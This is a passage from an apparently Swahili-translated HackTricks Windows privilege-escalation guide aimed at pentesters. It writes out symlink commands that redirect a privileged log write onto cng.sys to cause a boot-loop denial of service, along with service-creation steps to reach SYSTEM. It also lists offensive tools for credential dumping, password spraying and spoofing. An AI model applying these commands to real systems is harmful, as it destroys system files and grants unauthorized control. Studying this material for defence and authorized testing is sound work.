**Mfano wa chain**
1. Soma config ili kupata privileged log destination, kwa mfano `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` katika `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza njia hiyo upya bila admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri component yenye privileges iandike log (kwa mfano, admin anachochea "send test SMS"). Sasa write itaishia katika `C:\Windows\System32\cng.sys`.
4. Kagua target iliyo overwritten (hex/PE parser) ili kuthibitisha corruption; reboot inalazimisha Windows ipakie driver path iliyotampered → **boot loop DoS**. Hii pia inatumika kwa file yoyote iliyolindwa ambayo privileged service itafungua kwa ajili ya write.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa copy ipo katika `C:\Windows\System32\cng.sys` inaweza kujaribiwa kwanza, hivyo kuifanya kuwa DoS sink ya kuaminika kwa data iliyoharibika.



## **Kutoka High Integrity hadi System**

### **Huduma mpya**

Ikiwa tayari unaendesha High Integrity process, **path to SYSTEM** inaweza kuwa rahisi kwa **kuunda na ku-execute service mpya**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Unapounda service binary hakikisha ni service halali au binary inatekeleza vitendo vinavyohitajika haraka, kwa sababu itauawa ndani ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye mchakato wa High Integrity unaweza kujaribu **kuwezesha AlwaysInstallElevated registry entries** na **kusakinisha** reverse shell ukitumia _**.msi**_ wrapper.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kusakinisha _.msi_ package hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kuipata code hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una token privileges hizo (huenda utazipata kwenye mchakato ambao tayari ni High Integrity), utaweza **kufungua karibu mchakato wowote** (isipokuwa protected processes) kwa kutumia SeDebug privilege, **kunakili token** ya mchakato huo, na kuunda **mchakato holela wenye token hiyo**.\
Kutumia technique hii kwa kawaida ni **kuchagua mchakato wowote unaoendesha kama SYSTEM wenye token privileges zote** (_ndiyo, unaweza kupata SYSTEM processes zisizo na token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza technique iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Technique hii hutumiwa na meterpreter kufanya privilege escalation katika `getsystem`. Technique hii inahusisha **kuunda pipe na kisha kuunda/kutumia vibaya service ili kuandika kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia **`SeImpersonate`** privilege itaweza **ku-impersonate token** ya pipe client (service), na kupata SYSTEM privileges.\
Ikiwa ungependa [**kujifunza zaidi kuhusu name pipes unapaswa kusoma hii**](#named-pipe-client-impersonation).\
Ikiwa ungependa kusoma mfano wa [**jinsi ya kutoka high integrity hadi System kwa kutumia name pipes unapaswa kusoma hii**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukifanikiwa **ku-hijack dll** inayokuwa **loaded** na **process** unaoendesha kama **SYSTEM**, utaweza kutekeleza arbitrary code kwa permissions hizo. Kwa hiyo Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation, na, zaidi ya hayo, ni **rahisi zaidi kuitekeleza kutoka kwenye high integrity process** kwa sababu itakuwa na **write permissions** kwenye folders zinazotumika kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Tool bora ya kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Hukagua misconfigurations na sensitive files (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Hukagua baadhi ya misconfigurations zinazowezekana na kukusanya taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Hukagua misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za saved sessions za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough ukiwa local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Hufanya spray ya passwords zilizokusanywa kwenye domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni PowerShell ADIDNS/LLMNR/mDNS spoofer na man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Hutafuta privesc vulnerabilities zinazojulikana (DEPRECATED kwa Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Hukagua local checks **(Inahitaji Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Hutafuta privesc vulnerabilities zinazojulikana (inahitaji ku-compile kwa kutumia VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Hufanya enumeration ya host ikitafuta misconfigurations (ni gather info tool zaidi kuliko privesc) (inahitaji ku-compile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye softwares nyingi (precompiled exe kwenye github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwenda C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Hukagua misconfiguration (executable precompiled kwenye github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Hukagua misconfigurations zinazowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool iliyoundwa kulingana na post hii (haihitaji accesschk kufanya kazi vizuri, lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma output ya **systeminfo** na kupendekeza working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma output ya **systeminfo** na kupendekeza working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unapaswa ku-compile project kwa kutumia version sahihi ya .NET ([**angalia hii**](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona version ya .NET iliyosakinishwa kwenye victim host unaweza kufanya:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Marejeo

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
